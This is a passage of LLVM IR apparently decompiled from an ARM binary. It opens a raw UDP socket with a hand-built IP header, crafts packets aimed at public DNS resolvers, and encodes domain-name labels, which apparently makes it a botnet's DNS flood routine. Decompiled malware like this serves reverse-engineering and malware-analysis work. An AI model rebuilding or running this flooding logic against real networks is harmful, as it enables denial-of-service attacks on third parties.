  %v0_f7dc = phi i32 [ %v1_f7dc, %dec_label_pc_f7d8 ], [ %v0_f79c, %dec_label_pc_f7ac ]
  %v0_f810 = phi i32 [ %v0_f81042, %dec_label_pc_f7d8 ], [ 0, %dec_label_pc_f7ac ]
  %v0_f7f0 = phi i32 [ %v0_f7f038, %dec_label_pc_f7d8 ], [ 0, %dec_label_pc_f7ac ]
  %v0_f7f8 = phi i32 [ %v1_f7f8, %dec_label_pc_f7d8 ], [ %v2_f7bc, %dec_label_pc_f7ac ]
  %v1_f7ec = inttoptr i32 %v0_f7f8 to i8*
  %v2_f7ec = load i8, i8* %v1_f7ec, align 1
  %v3_f7ec = zext i8 %v2_f7ec to i32
  store i32 %v3_f7ec, i32* %r3.global-to-local, align 4
  %v2_f7f0 = icmp eq i32 %v0_f7f0, 0
  store i1 %v2_f7f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f7f4, i32* %ip.global-to-local, align 4
  %v1_f7f8 = add i32 %v0_f7f8, 1
  store i32 %v1_f7f8, i32* %r1.global-to-local, align 4
  %v1_f7fc = add nsw i32 %v3_f7ec, -48
  store i32 %v1_f7fc, i32* %r0.global-to-local, align 4
  br i1 %v2_f7f0, label %dec_label_pc_f804, label %dec_label_pc_f814

dec_label_pc_f804:                                ; preds = %dec_label_pc_f7ec
  %v7_f804 = icmp eq i8 %v2_f7ec, 9
  store i1 %v7_f804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f804, label %dec_label_pc_f7d8, label %bb

bb:                                               ; preds = %dec_label_pc_f804
  %v8_f808 = icmp eq i8 %v2_f7ec, 32
  store i1 %v8_f808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f808, label %dec_label_pc_f7d8, label %dec_label_pc_f810

dec_label_pc_f810:                                ; preds = %bb
  %v1_f810 = add i32 %v0_f810, 1
  store i32 %v1_f810, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f814

dec_label_pc_f814:                                ; preds = %dec_label_pc_f7ec, %dec_label_pc_f810
  %v0_f81043 = phi i32 [ %v0_f810, %dec_label_pc_f7ec ], [ %v1_f810, %dec_label_pc_f810 ]
  %v0_f7f039 = phi i32 [ %v0_f7f0, %dec_label_pc_f7ec ], [ %v1_f810, %dec_label_pc_f810 ]
  %v7_f814 = icmp eq i8 %v2_f7ec, 46
  store i1 %v7_f814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f814, label %dec_label_pc_f7d0, label %bb138

bb138:                                            ; preds = %dec_label_pc_f814
  %v8_f818 = icmp eq i32 %v1_f7fc, 9
  store i1 %v8_f818, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_f7fc, 10
  br i1 %tmp, label %dec_label_pc_f7d0, label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f7d0, %bb138
  %v0_f7dc.lcssa = phi i32 [ %v1_f7f4, %dec_label_pc_f7d0 ], [ %v0_f7dc, %bb138 ]
  %v2_f824 = sub i32 %v0_f7dc.lcssa, %v0_f79c
  store i32 %v2_f824, i32* %r2.global-to-local, align 4
  store i32 %v2_f7bc, i32* %r1.global-to-local, align 4
  store i32 %v2_f7c4, i32* %r0.global-to-local, align 4
  %v3_f830 = call i32 @function_14688(i32 %v2_f7c4, i32 %v2_f7bc, i32 %v2_f824)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_f7c4, i32* %r0.global-to-local, align 4
  %v2_f840 = load i32, i32* %r7.global-to-local, align 4
  %v3_f840 = inttoptr i32 %v2_f840 to i8*
  store i8 0, i8* %v3_f840, align 1
  %v1_f844 = call i32 @_inet_addr(i32 %v2_f7c4)
  store i32 %v1_f844, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f84c20:                              ; preds = %dec_label_pc_fd0c
  unreachable

dec_label_pc_f84c:                                ; preds = %dec_label_pc_fd84, %dec_label_pc_fd74, %dec_label_pc_fd68, %dec_label_pc_fd54, %dec_label_pc_f820
  %v29_fd5074 = phi i32 [ %v1_fd10, %dec_label_pc_fd84 ], [ %v1_fd10, %dec_label_pc_fd74 ], [ %v1_fd10, %dec_label_pc_fd68 ], [ %v1_fd10, %dec_label_pc_fd54 ], [ %v1_f844, %dec_label_pc_f820 ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_fd84 ], [ 104859200, %dec_label_pc_fd74 ], [ 707416650, %dec_label_pc_fd68 ], [ 134744072, %dec_label_pc_fd54 ], [ %v1_f844, %dec_label_pc_f820 ]
  store i32 %v6_f710, i32* %ip.global-to-local, align 4
  %v2_f850 = icmp eq i32 %v6_f710, 0
  store i1 %v2_f850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f850, label %dec_label_pc_fd48, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f84c
  store i32 %v6_f710, i32* %r0.global-to-local, align 4
  %v1_f85c = inttoptr i32 %v6_f710 to i8*
  %v2_f85c = call i32 @function_1460c(i8* %v1_f85c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_f870 = call i32 @_socket(i32 2, i32 3, i32 17)
  store i32 %v3_f870, i32* %r0.global-to-local, align 4
  %v7_f874 = icmp eq i32 %v3_f870, -1
  store i1 %v7_f874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f874, label %dec_label_pc_fd48, label %dec_label_pc_f880

dec_label_pc_f880:                                ; preds = %dec_label_pc_f858
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_f88c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_f88c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_f8a0 = call i32 @_setsockopt(i32 %v3_f870, i32 0, i32 3, i32 %v6_f88c, i32 4)
  store i32 %v5_f8a0, i32* %r0.global-to-local, align 4
  %v7_f8a4 = icmp eq i32 %v5_f8a0, -1
  store i1 %v7_f8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8a4, label %dec_label_pc_fd40, label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f880
  store i32 %v1_f5fc, i32* %r0.global-to-local, align 4
  %v3_f8b4 = mul i32 %v7_f650, 65536
  store i32 %v3_f8b4, i32* %lr.global-to-local, align 4
  %v0_f8b8 = load i32, i32* @sl, align 4
  %v3_f8b8 = mul i32 %v0_f8b8, 65536
  store i32 %v3_f8b8, i32* %sl.global-to-local, align 4
  %v0_f8bc = load i32, i32* %r8.global-to-local, align 4
  %v0_f8c0 = load i32, i32* %fp.global-to-local, align 4
  %v3_f8c0 = mul i32 %v0_f8c0, 65536
  store i32 %v3_f8c0, i32* %r5.global-to-local, align 4
  %v0_f8c4 = load i32, i32* %sb.global-to-local, align 4
  %v3_f8c4 = mul i32 %v0_f8c4, 65536
  store i32 %v3_f8c4, i32* %sb.global-to-local, align 4
  %v5_f8c8 = trunc i32 %v0_f8bc to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_f8d0 = urem i32 %v7_f650, 65536
  store i32 %v3_f8d0, i32* %r2.global-to-local, align 4
  %v3_f8d4 = urem i32 %v0_f8c0, 65536
  store i32 %v3_f8d4, i32* %r3.global-to-local, align 4
  %v3_f8d8 = urem i32 %v0_f8c4, 65536
  store i32 %v3_f8d8, i32* %r4.global-to-local, align 4
  %v3_f8dc = urem i32 %v0_f8b8, 65536
  store i32 %v3_f8dc, i32* %r8.global-to-local, align 4
  %v2_f8e0 = icmp eq i32 %v1_f5fc, 0
  store i1 %v2_f8e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_f8e0, label %dec_label_pc_fd30, label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %dec_label_pc_f8ac
  %v4_f908 = sext i8 %v5_f8c8 to i32
  %v2_f90c = add i32 %v4_f908, %v2_f85c
  store i32 %v2_f90c, i32* @fp, align 4
  %v3_f910 = mul i32 %v2_f90c, 65536
  %v1_f914 = add i32 %v3_f910, 1769472
  store i32 %v1_f914, i32* %r6.global-to-local, align 4
  %v1_f918 = add i32 %v3_f910, 3080192
  %v1_f92c = urem i32 %v0_f8b8, 256
  %v3_f93c = udiv i32 %v1_f914, 256
  %v1_f940 = urem i32 %v7_f650, 256
  %v1_f944 = and i32 %v3_f93c, 65280
  %v1_f948 = urem i32 %v0_f8c4, 256
  %v3_f94c = mul nuw nsw i32 %v1_f92c, 256
  %v1_f954 = urem i32 %v0_f8c0, 256
  %v3_f958 = mul nuw nsw i32 %v1_f948, 256
  %tmp139 = udiv i32 %v0_f8b8, 256
  %v4_f95c = urem i32 %tmp139, 256
  %v5_f95c = or i32 %v4_f95c, %v3_f94c
  store i32 %v5_f95c, i32* %r8.global-to-local, align 4
  %v4_f960 = udiv i32 %v1_f914, 16777216
  %v5_f960 = or i32 %v1_f944, %v4_f960
  store i32 %v5_f960, i32* %sl.global-to-local, align 4
  %tmp140 = udiv i32 %v0_f8c0, 256
  %v3_f96c = urem i32 %tmp140, 256
  %v4_f970 = sdiv i32 %v1_f918, 16777216
  %tmp141 = udiv i32 %v7_f650, 256
  %v4_f978 = mul nuw nsw i32 %v1_f954, 256
  %v5_f978 = or i32 %v4_f978, %v3_f96c
  store i32 %v5_f978, i32* %r5.global-to-local, align 4
  %tmp142 = udiv i32 %v0_f8c4, 256
  %v4_f97c = urem i32 %tmp142, 256
  %v5_f97c = or i32 %v4_f97c, %v3_f958
  store i32 %v5_f97c, i32* %sb.global-to-local, align 4
  store i32 %v1_f940, i32* %r0.global-to-local, align 4
  %v1_f988 = add i32 %v2_f85c, 1
  store i32 %v1_f988, i32* %r7.global-to-local, align 4
  %v3_f98c = ashr i32 %v1_f918, 31
  store i32 %v3_f98c, i32* %lr.global-to-local, align 4
  store i32 %v1_f954, i32* %r1.global-to-local, align 4
  store i32 %v1_f948, i32* %r2.global-to-local, align 4
  %v3_f99875 = udiv i32 %v1_f944, 256
  store i32 %v3_f99875, i32* %r3.global-to-local, align 4
  store i32 %v1_f92c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_f9fc = sext i8 %v5_f64c to i32
  %sext13 = mul i32 %v6_f668, 16777216
  %v4_fa14 = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %tmp141, 16777216
  %v4_fa28 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_f650, 16777216
  %v4_fa2c = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_f914, 256
  %v4_fa5c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_f8c4, 16777216
  %v4_fa60 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_f8c0, 16777216
  %v4_fa84 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_f8b8, 16777216
  %v4_fa90 = sdiv i32 %sext19, 16777216
  %v1_fa0c = trunc i32 %v4_f970 to i8
  %extract.t = trunc i32 %v3_f98c to i8
  br label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_fb24, %dec_label_pc_f904
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_f9c4 = call i32 @_calloc(i32 600, i32 1)
  store i32 %v2_f9c4, i32* %r0.global-to-local, align 4
  store i32 %v2_f614, i32* %lr.global-to-local, align 4
  %v3_f9cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f9cc, i32* %r3.global-to-local, align 4
  %v2_f9d0 = load i32, i32* %r4.global-to-local, align 4
  %v5_f9d0 = mul i32 %v2_f9d0, 4
  %v6_f9d0 = add i32 %v5_f9d0, %v2_f614
  %v7_f9d0 = inttoptr i32 %v6_f9d0 to i32*
  store i32 %v2_f9c4, i32* %v7_f9d0, align 4
  %v0_f9d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f9d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_f9d4 = mul i32 %v1_f9d4, 4
  %v5_f9d4 = add i32 %v4_f9d4, %v0_f9d4
  %v6_f9d4 = inttoptr i32 %v5_f9d4 to i32*
  %v7_f9d4 = load i32, i32* %v6_f9d4, align 4
  store i32 %v7_f9d4, i32* %r1.global-to-local, align 4
  %v1_f9d8 = inttoptr i32 %v7_f9d4 to i8*
  %v2_f9d8 = load i8, i8* %v1_f9d8, align 1
  %tmp154 = urem i8 %v2_f9d8, 16
  %v1_f9dc = zext i8 %tmp154 to i32
  %v1_f9e0 = or i32 %v1_f9dc, 64
  store i32 %v1_f9e0, i32* %r2.global-to-local, align 4
  %v1_f9e4 = trunc i32 %v1_f9e0 to i8
  store i8 %v1_f9e4, i8* %v1_f9d8, align 1
  %v0_f9e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f9e8 = inttoptr i32 %v0_f9e8 to i8*
  %v2_f9e8 = load i8, i8* %v1_f9e8, align 1
  %v1_f9ec = and i8 %v2_f9e8, -16
  %v1_f9f0 = or i8 %v1_f9ec, 5
  store i32 %v1_f694, i32* %r0.global-to-local, align 4
  store i8 %v1_f9f0, i8* %v1_f9e8, align 1
  store i32 %v4_f9fc, i32* %r2.global-to-local, align 4
  %v2_fa00 = load i32, i32* %r1.global-to-local, align 4
  %v3_fa00 = add i32 %v2_fa00, 1
  %v4_fa00 = inttoptr i32 %v3_fa00 to i8*
  store i8 %v5_f64c, i8* %v4_fa00, align 1
  store i32 %v4_f970, i32* %r3.global-to-local, align 4
  %v0_fa08 = load i32, i32* %r0.global-to-local, align 4
  %v2_fa08 = icmp eq i32 %v0_fa08, 0
  store i1 %v2_fa08, i1* %cpsr_z.global-to-local, align 1
  %v2_fa0c = load i32, i32* %r1.global-to-local, align 4
  %v3_fa0c = add i32 %v2_fa0c, 2
  %v4_fa0c = inttoptr i32 %v3_fa0c to i8*
  store i8 %v1_fa0c, i8* %v4_fa0c, align 1
  store i32 %v3_f98c, i32* %r4.global-to-local, align 4
  store i32 %v4_fa14, i32* %r0.global-to-local, align 4
  %v0_fa18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa18, label %.thread21, label %bb143

bb143:                                            ; preds = %dec_label_pc_f9bc
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_fa1c = load i32, i32* %r1.global-to-local, align 4
  %v4_fa1c = add i32 %v3_fa1c, 6
  %v5_fa1c = inttoptr i32 %v4_fa1c to i8*
  store i8 64, i8* %v5_fa1c, align 1
  %v0_fa24.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t76 = trunc i32 %v0_fa24.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_f9bc, %bb143
  %v0_fa24.off0 = phi i8 [ %extract.t, %dec_label_pc_f9bc ], [ %extract.t76, %bb143 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_fa24 = load i32, i32* %r1.global-to-local, align 4
  %v3_fa24 = add i32 %v2_fa24, 3
  %v4_fa24 = inttoptr i32 %v3_fa24 to i8*
  store i8 %v0_fa24.off0, i8* %v4_fa24, align 1
  store i32 %v4_fa28, i32* %ip.global-to-local, align 4
  store i32 %v4_fa2c, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* %r4.global-to-local, align 4
  %v0_fa34 = load i32, i32* %r0.global-to-local, align 4
  %v1_fa34 = trunc i32 %v0_fa34 to i8
  %v2_fa34 = load i32, i32* %r1.global-to-local, align 4
  %v3_fa34 = add i32 %v2_fa34, 8
  %v4_fa34 = inttoptr i32 %v3_fa34 to i8*
  store i8 %v1_fa34, i8* %v4_fa34, align 1
  %v0_fa38 = load i32, i32* %r3.global-to-local, align 4
  %v1_fa38 = trunc i32 %v0_fa38 to i8
  %v2_fa38 = load i32, i32* %r1.global-to-local, align 4
  %v3_fa38 = add i32 %v2_fa38, 9
  %v4_fa38 = inttoptr i32 %v3_fa38 to i8*
  store i8 %v1_fa38, i8* %v4_fa38, align 1
  %v0_fa3c = load i32, i32* %lr.global-to-local, align 4
  %v1_fa3c = trunc i32 %v0_fa3c to i8
  %v2_fa3c = load i32, i32* %r1.global-to-local, align 4
  %v3_fa3c = add i32 %v2_fa3c, 5
  %v4_fa3c = inttoptr i32 %v3_fa3c to i8*
  store i8 %v1_fa3c, i8* %v4_fa3c, align 1
  %v0_fa40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa40, label %.thread22, label %bb144

.thread22:                                        ; preds = %.thread21
  %v2_fa4423 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_fa4423, i32* %r3.global-to-local, align 4
  store i32 %v4_f908, i32* %lr.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_fa44 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_fa44, i32* %r3.global-to-local, align 4
  store i32 %v4_f908, i32* %lr.global-to-local, align 4
  %v3_fa4c = load i32, i32* %r1.global-to-local, align 4
  %v4_fa4c = add i32 %v3_fa4c, 7
  %v5_fa4c = inttoptr i32 %v4_fa4c to i8*
  store i8 0, i8* %v5_fa4c, align 1
  %v0_fa54.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_fa58.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %.thread22, %bb144
  %v0_fa58 = phi i32 [ %v2_fa4423, %.thread22 ], [ %v0_fa58.pre, %bb144 ]
  %v0_fa54 = phi i32 [ %v4_f908, %.thread22 ], [ %v0_fa54.pre, %bb144 ]
  %v0_fa50 = load i32, i32* %r1.global-to-local, align 4
  %v1_fa50 = add i32 %v0_fa54, 41
  %v2_fa54 = add i32 %v1_fa50, %v0_fa50
  store i32 %v2_fa54, i32* %r4.global-to-local, align 4
  %v2_fa58 = add i32 %v0_fa50, 12
  %v3_fa58 = inttoptr i32 %v2_fa58 to i32*
  store i32 %v0_fa58, i32* %v3_fa58, align 4
  store i32 %v4_fa5c, i32* %r2.global-to-local, align 4
  store i32 %v4_fa60, i32* %r3.global-to-local, align 4
  %v0_fa64 = load i32, i32* %r1.global-to-local, align 4
  %v1_fa64 = add i32 %v0_fa64, 20
  store i32 %v1_fa64, i32* %r0.global-to-local, align 4
  %v0_fa68 = load i32, i32* %ip.global-to-local, align 4
  %v1_fa68 = trunc i32 %v0_fa68 to i8
  %v3_fa68 = add i32 %v0_fa64, 4
  %v4_fa68 = inttoptr i32 %v3_fa68 to i8*
  store i8 %v1_fa68, i8* %v4_fa68, align 1
  %v0_fa6c = load i32, i32* %r2.global-to-local, align 4
  %v1_fa6c = trunc i32 %v0_fa6c to i8
  %v2_fa6c = load i32, i32* %r0.global-to-local, align 4
  %v3_fa6c = add i32 %v2_fa6c, 5
  %v4_fa6c = inttoptr i32 %v3_fa6c to i8*
  store i8 %v1_fa6c, i8* %v4_fa6c, align 1
  %v0_fa70 = load i32, i32* %r3.global-to-local, align 4
  %v1_fa70 = trunc i32 %v0_fa70 to i8
  %v2_fa70 = load i32, i32* %r0.global-to-local, align 4
  %v3_fa70 = add i32 %v2_fa70, 3
  %v4_fa70 = inttoptr i32 %v3_fa70 to i8*
  store i8 %v1_fa70, i8* %v4_fa70, align 1
  %v0_fa74 = load i32, i32* %sb.global-to-local, align 4
  %v1_fa74 = trunc i32 %v0_fa74 to i8
  %v2_fa74 = load i32, i32* %r0.global-to-local, align 4
  %v3_fa74 = add i32 %v2_fa74, 2
  %v4_fa74 = inttoptr i32 %v3_fa74 to i8*
  store i8 %v1_fa74, i8* %v4_fa74, align 1
  %v0_fa78 = load i32, i32* %sl.global-to-local, align 4
  %v1_fa78 = trunc i32 %v0_fa78 to i8
  %v2_fa78 = load i32, i32* %r0.global-to-local, align 4
  %v3_fa78 = add i32 %v2_fa78, 4
  %v4_fa78 = inttoptr i32 %v3_fa78 to i8*
  store i8 %v1_fa78, i8* %v4_fa78, align 1
  %v0_fa7c = load i32, i32* %r5.global-to-local, align 4
  %v1_fa7c = trunc i32 %v0_fa7c to i8
  %v2_fa7c = load i32, i32* %r1.global-to-local, align 4
  %v3_fa7c = add i32 %v2_fa7c, 20
  %v4_fa7c = inttoptr i32 %v3_fa7c to i8*
  store i8 %v1_fa7c, i8* %v4_fa7c, align 1
  store i32 %v4_fa84, i32* %r2.global-to-local, align 4
  %v1_fa88 = load i32, i32* %r1.global-to-local, align 4
  %v2_fa88 = add i32 %v1_fa88, 16
  %v3_fa88 = inttoptr i32 %v2_fa88 to i32*
  store i32 %stack_var_-2176.0, i32* %v3_fa88, align 4
  %v0_fa8c = load i32, i32* %r2.global-to-local, align 4
  %v1_fa8c = trunc i32 %v0_fa8c to i8
  %v2_fa8c = load i32, i32* %r0.global-to-local, align 4
  %v3_fa8c = add i32 %v2_fa8c, 1
  %v4_fa8c = inttoptr i32 %v3_fa8c to i8*
  store i8 %v1_fa8c, i8* %v4_fa8c, align 1
  store i32 %v4_fa90, i32* %lr.global-to-local, align 4
  store i32 %v4_f908, i32* %r0.global-to-local, align 4
  %v0_fa98 = load i32, i32* %r1.global-to-local, align 4
  %v1_fa98 = add i32 %v0_fa98, 28
  store i32 %v1_fa98, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_faa4 = load i32, i32* %r8.global-to-local, align 4
  %v1_faa4 = trunc i32 %v0_faa4 to i8
  %v4_faa4 = inttoptr i32 %v1_fa98 to i8*
  store i8 %v1_faa4, i8* %v4_faa4, align 1
  %v0_faa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_faa8 = trunc i32 %v0_faa8 to i8
  %v2_faa8 = load i32, i32* %ip.global-to-local, align 4
  %v3_faa8 = add i32 %v2_faa8, 5
  %v4_faa8 = inttoptr i32 %v3_faa8 to i8*
  store i8 %v1_faa8, i8* %v4_faa8, align 1
  %v0_faac = load i32, i32* %lr.global-to-local, align 4
  %v1_faac = trunc i32 %v0_faac to i8
  %v2_faac = load i32, i32* %ip.global-to-local, align 4
  %v3_faac = add i32 %v2_faac, 1
  %v4_faac = inttoptr i32 %v3_faac to i8*
  store i8 %v1_faac, i8* %v4_faac, align 1
  %v0_fab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_fab0 = trunc i32 %v0_fab0 to i8
  %v2_fab0 = load i32, i32* %ip.global-to-local, align 4
  %v3_fab0 = add i32 %v2_fab0, 2
  %v4_fab0 = inttoptr i32 %v3_fab0 to i8*
  store i8 %v1_fab0, i8* %v4_fab0, align 1
  %v0_fab4 = load i32, i32* %r6.global-to-local, align 4
  %v1_fab4 = trunc i32 %v0_fab4 to i8
  %v2_fab4 = load i32, i32* %ip.global-to-local, align 4
  %v3_fab4 = add i32 %v2_fab4, 3
  %v4_fab4 = inttoptr i32 %v3_fab4 to i8*
  store i8 %v1_fab4, i8* %v4_fab4, align 1
  %v0_fab8 = load i32, i32* %r6.global-to-local, align 4
  %v1_fab8 = trunc i32 %v0_fab8 to i8
  %v2_fab8 = load i32, i32* %ip.global-to-local, align 4
  %v3_fab8 = add i32 %v2_fab8, 4
  %v4_fab8 = inttoptr i32 %v3_fab8 to i8*
  store i8 %v1_fab8, i8* %v4_fab8, align 1
  %v0_fabc = load i32, i32* %r0.global-to-local, align 4
  %v1_fabc = trunc i32 %v0_fabc to i8
  %v2_fabc = load i32, i32* %r1.global-to-local, align 4
  %v3_fabc = add i32 %v2_fabc, 40
  %v4_fabc = inttoptr i32 %v3_fabc to i8*
  store i8 %v1_fabc, i8* %v4_fabc, align 1
  store i32 %v6_f710, i32* %r1.global-to-local, align 4
  %v0_fac4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_fac4, i32* %r2.global-to-local, align 4
  %v0_fac8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fac8 = add i32 %v0_fac8, 1
  store i32 %v1_fac8, i32* %r0.global-to-local, align 4
  %v3_facc = call i32 @function_14688(i32 %v1_fac8, i32 %v6_f710, i32 %v0_fac4)
  store i32 %v3_facc, i32* %r0.global-to-local, align 4
  store i32 %v2_f85c, i32* %r1.global-to-local, align 4
  %v1_fad4 = load i32, i32* %r6.global-to-local, align 4
  %v9_fad4 = icmp eq i32 %v2_f85c, %v1_fad4
  store i1 %v9_fad4, i1* %cpsr_z.global-to-local, align 1
  %v7_fad8 = icmp sgt i32 %v2_f85c, %v1_fad4
  store i32 %v1_fad4, i32* %lr.global-to-local, align 4
  %v0_fae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fae8, i32* %r2.global-to-local, align 4
  %extract.t78 = trunc i32 %v1_fad4 to i8
  br i1 %v7_fad8, label %dec_label_pc_fae4, label %dec_label_pc_fb24

dec_label_pc_fae4:                                ; preds = %bb145
  store i32 %v1_fad4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %bb148, %dec_label_pc_fae4
  %v0_fb0c85151 = phi i32 [ %v0_fb0c85152, %bb148 ], [ %v1_fad4, %dec_label_pc_fae4 ]
  %v1_fb0033 = phi i32 [ %v1_fb1091, %bb148 ], [ %v1_fad4, %dec_label_pc_fae4 ]
  %v1_fafc.off0 = phi i8 [ %v1_fafc56.off0, %bb148 ], [ %extract.t78, %dec_label_pc_fae4 ]
  %v0_fb0032 = phi i32 [ %v0_fb00325488, %bb148 ], [ %v0_fae8, %dec_label_pc_fae4 ]
  store i32 %v6_f710, i32* %ip.global-to-local, align 4
  %v2_faf4 = add i32 %v1_fb0033, %v6_f710
  %v3_faf4 = inttoptr i32 %v2_faf4 to i8*
  %v4_faf4 = load i8, i8* %v3_faf4, align 1
  %v6_faf4 = zext i8 %v4_faf4 to i32
  store i32 %v6_faf4, i32* %r3.global-to-local, align 4
  %v7_faf8 = icmp eq i8 %v4_faf4, 46
  store i1 %v7_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf8, label %bb146, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_faf0
  %v2_fb0034 = add i32 %v1_fb0033, %v0_fb0032
  store i32 %v2_fb0034, i32* %r0.global-to-local, align 4
  br label %.thread35

bb146:                                            ; preds = %dec_label_pc_faf0
  %v3_fafc = load i32, i32* %r2.global-to-local, align 4
  %v4_fafc = inttoptr i32 %v3_fafc to i8*
  store i8 %v1_fafc.off0, i8* %v4_fafc, align 1
  %v0_fb04.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_fb00 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb00 = load i32, i32* %r1.global-to-local, align 4
  %v2_fb00 = add i32 %v1_fb00, %v0_fb00
  store i32 %v2_fb00, i32* %r0.global-to-local, align 4
  br i1 %v0_fb04.pr, label %bb147, label %bb146..thread35_crit_edge

bb146..thread35_crit_edge:                        ; preds = %bb146
  %v0_fb0c85.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb147:                                            ; preds = %bb146
  %v2_fb04 = add i32 %v2_fb00, 1
  store i32 %v2_fb04, i32* %r2.global-to-local, align 4
  store i32 %v2_f85c, i32* %r0.global-to-local, align 4
  %v0_fb0c = load i32, i32* %lr.global-to-local, align 4
  %v1_fb0c = add i32 %v0_fb0c, 1
  store i32 %v1_fb0c, i32* %ip.global-to-local, align 4
  %v1_fb10 = add i32 %v1_fb00, 1
  store i32 %v1_fb10, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb148

.thread35:                                        ; preds = %bb146..thread35_crit_edge, %.thread31
  %v0_fb0c85 = phi i32 [ %v0_fb0c85.pre, %bb146..thread35_crit_edge ], [ %v0_fb0c85151, %.thread31 ]
  %v0_fb10.ph = phi i32 [ %v1_fb00, %bb146..thread35_crit_edge ], [ %v1_fb0033, %.thread31 ]
  %v0_fb003254.ph = phi i32 [ %v0_fb00, %bb146..thread35_crit_edge ], [ %v0_fb0032, %.thread31 ]
  store i32 %v2_f85c, i32* %r0.global-to-local, align 4
  %v1_fb0c86 = add i32 %v0_fb0c85, 1
  store i32 %v1_fb0c86, i32* %ip.global-to-local, align 4
  %v1_fb1087 = add i32 %v0_fb10.ph, 1
  store i32 %v1_fb1087, i32* %r1.global-to-local, align 4
  %v2_fb18 = urem i32 %v1_fb0c86, 256
  store i32 %v2_fb18, i32* %lr.global-to-local, align 4
  %extract.t81 = trunc i32 %v1_fb0c86 to i8
  br label %bb148

bb148:                                            ; preds = %bb147, %.thread35
  %v0_fb0c85152 = phi i32 [ 0, %bb147 ], [ %v2_fb18, %.thread35 ]
  %v1_fb1091 = phi i32 [ %v1_fb10, %bb147 ], [ %v1_fb1087, %.thread35 ]
  %v0_fb00325488 = phi i32 [ %v0_fb00, %bb147 ], [ %v0_fb003254.ph, %.thread35 ]
  %v1_fafc56.off0 = phi i8 [ 0, %bb147 ], [ %extract.t81, %.thread35 ]
  %v9_fb1c = icmp eq i32 %v2_f85c, %v1_fb1091
  store i1 %v9_fb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fb1c, label %dec_label_pc_fb24.loopexit, label %dec_label_pc_faf0

dec_label_pc_fb24.loopexit:                       ; preds = %bb148
  %v2_fb24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fb24

dec_label_pc_fb24:                                ; preds = %dec_label_pc_fb24.loopexit, %bb145
  %v2_fb24 = phi i32 [ %v2_fb24.pre, %dec_label_pc_fb24.loopexit ], [ %v0_fae8, %bb145 ]
